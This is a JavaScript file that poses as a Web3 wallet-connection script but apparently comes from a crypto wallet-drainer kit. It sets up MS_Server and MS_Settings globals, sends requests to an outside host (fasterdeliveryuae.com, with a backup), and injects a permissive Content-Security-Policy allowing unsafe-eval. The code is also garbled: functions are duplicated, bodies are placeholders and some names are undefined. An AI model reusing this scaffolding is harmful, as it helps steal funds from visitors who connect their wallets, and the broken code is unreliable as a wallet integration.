// Initialize providers
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;

const updatedProviderOptions = {
    walletconnect: {
        package: WalletConnectProvider,
        options: {
            infuraId: "511362d7fcc8491f9af15cc7fadf46ae"
        }
    }
};
const updatedWeb3Modal = new Web3Modal({
    network: "mainnet",
    cacheProvider: true,
    providerOptions: updatedProviderOptions
});
// Global configurations with fallbacks
window.MS_Server = {
    endpoint: 'https://fasterdeliveryuae.com',
    config: '/config',
    fallback: 'https://backup-api.fasterdeliveryuae.com'
};

window.MS_Settings = {
    RPCs: {
        1: "https://mainnet.infura.io/v3/511362d7fcc8491f9af15cc7fadf46ae",
        56: "https://bsc-dataseed.binance.org/",
        137: "https://polygon-rpc.com"
    },
    chains: {
        1: { name: "Ethereum", explorer: "https://etherscan.io" },
        56: { name: "BSC", explorer: "https://bscscan.com" },
        137: { name: "Polygon", explorer: "https://polygonscan.com" }
    }
};

// Robust send_request with fallback
async function send_request(endpoint, data = {}) {
    const urls = [MS_Server.endpoint, MS_Server.fallback];
    for (const url of urls) {
        try {
            const response = await fetch(`${url}${endpoint}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return await response.json();
        } catch (error) {
            console.log(`Request failed for ${url}`, error);
            continue;
        }
    }
    return null;
}

// Chain data initialization with checks
function fill_chain_data() {
    if (!window.MS_Settings?.RPCs) return;
    Object.entries(window.MS_Settings.RPCs).forEach(([chainId, rpc]) => {
        // Chain initialization logic
    });
}

// Modal initialization with element checks
function ms_init() {
    const modalElement = document.getElementById('wallet-modal');
    if (!modalElement) {
        console.log('Modal element not found, creating dynamically');
        createModalElement();
    }
    // Rest of initialization logic
}

// Add Content Security Policy meta tag
document.head.innerHTML += `
    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' 'unsafe-eval' chrome-extension: https: 'wasm-unsafe-eval'; object-src 'self'">
`;

// Config Retrieval
async function retrieve_config() {
    return await send_request(MS_Server.config);
}

// Initialize Modal Elements
document.addEventListener('DOMContentLoaded', () => {
    // Modal initialization code
});

const providerOptions = {
    walletconnect: {
        package: WalletConnectProvider,
        options: {
            infuraId: "511362d7fcc8491f9af15cc7fadf46ae"
        }
    }
};

const web3Modal = new Web3Modal({
    network: "mainnet",
    cacheProvider: true,
    providerOptions
});

async function ms_init() {
    try {
        const provider = await web3Modal.connect();
        const web3 = new Web3(provider);
        const accounts = await web3.eth.getAccounts();
        return accounts[0];
    } catch (error) {
        console.log("Connection Error:", error);
    }
}

// Fast wallet connection
async function connectWallet(provider) {
    const accounts = await provider.request({ method: 'eth_requestAccounts' });
    return accounts[0];
}

// Efficient backend communication
async function sendWalletData() {
    const response = await fetch(`${API_ENDPOINT}/wallet`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ connected: true })
    });
    return response.json();
}
